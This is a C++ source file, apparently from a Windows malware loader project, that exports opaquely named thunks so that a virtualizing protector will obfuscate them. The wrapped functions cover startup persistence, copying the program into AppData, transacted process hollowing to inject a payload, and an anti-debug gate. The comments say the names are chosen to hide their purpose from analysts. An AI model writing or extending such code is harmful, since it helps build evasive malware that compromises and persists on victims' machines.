// exports_thunks.cpp
//
// Anchor points for BVM virtualization.
//
// The BVM protector picks functions to virtualize by walking the PE export
// table and taking every export whose name starts with a fixed prefix.
// Because exports are visible to anyone who runs `dumpbin /exports`, the
// names are DELIBERATELY OPAQUE - a short prefix ("bnr_") followed by a
// numeric tag. The mapping below is only for our own reference.
//
//   bnr_a01  ->  Persistence::IsRunningAsAdmin
//   bnr_a02  ->  Persistence::AddToStartup
//   bnr_a03  ->  Persistence::RemoveFromStartup
//   bnr_a04  ->  Persistence::CopySelfToAppData
//   bnr_a05  ->  Persistence::GetExecutablePath
//   bnr_a06  ->  Persistence::GetExecutableName
//
//   bnr_b01  ->  transacted_hollowing
//
//   bnr_c01  ->  __dvm_antidebug_gate
//
// NOTE: main / WinMain cannot be exported (they are the EXE entry point);
// they are resolved via the .map file - see CryptPage::loadMapNames.

#include <string>
#include <windows.h>

// Persistence is an optional client module (ENABLE_PERSISTENCE). When it is
// off, persistence.cpp is excluded from the build and the header must not
// be pulled in — otherwise the bnr_a0* thunks below would emit unresolved
// references to Persistence::* symbols at link time.
#ifdef ENABLE_PERSISTENCE
#include "persistence.h"
#endif

// inject_core.cpp exposes this without a header - forward-declare.
DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, LPWSTR args);

#define BVM_EXPORT extern "C" __declspec(dllexport)

// ---- Persistence ---------------------------------------------------------
// Gated together with the module so a build with persistence off simply
// omits these anchors — the BVM protector will then only find bnr_b01 in
// the export table, which is the correct behavior (you can't virtualize
// code that isn't compiled into the binary).
#ifdef ENABLE_PERSISTENCE
BVM_EXPORT bool bnr_a01()                            { return Persistence::IsRunningAsAdmin(); }
BVM_EXPORT bool bnr_a02()                            { return Persistence::AddToStartup(); }
BVM_EXPORT bool bnr_a03()                            { return Persistence::RemoveFromStartup(); }
BVM_EXPORT const char* bnr_a04()
{
    static thread_local std::string s;
    s = Persistence::CopySelfToAppData();
    return s.c_str();
}
BVM_EXPORT const char* bnr_a05()
{
    static thread_local std::string s;
    s = Persistence::GetExecutablePath();
    return s.c_str();
}
BVM_EXPORT const char* bnr_a06()
{
    static thread_local std::string s;
    s = Persistence::GetExecutableName();
    return s.c_str();
}
#endif // ENABLE_PERSISTENCE

// ---- Hollowing -----------------------------------------------------------
BVM_EXPORT DWORD bnr_b01(wchar_t* targetPath, BYTE* payloadBuf, DWORD payloadSize, LPWSTR args)
{
    return transacted_hollowing(targetPath, payloadBuf, payloadSize, args);
}

// ---- Anti-debug gate -----------------------------------------------------
extern "C" void __dvm_antidebug_gate();
BVM_EXPORT void bnr_c01() { __dvm_antidebug_gate(); }
